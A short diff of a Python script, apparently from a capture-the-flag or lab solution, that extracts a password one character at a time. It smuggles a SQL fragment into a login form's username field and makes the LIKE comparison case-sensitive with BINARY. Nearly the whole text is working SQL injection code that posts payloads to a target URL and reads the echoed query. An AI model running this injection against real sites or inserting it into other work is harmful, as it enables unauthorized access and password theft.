@@ -9,7 +9,7 @@ passwd_len = 32
 for i in range(len(passwd), passwd_len):
 	for char in string.digits + string.ascii_letters:
 		trying = f"{passwd}{char}"
-		cmd = f"{user}\" and password LIKE \"{trying}%"
+		cmd = f"{user}\" and BINARY password LIKE \"{trying}%"
 		r = requests.post(url, data={'username':cmd})
 
 		splitted = r.text.split('Executing query: ')[1].split('<br>')
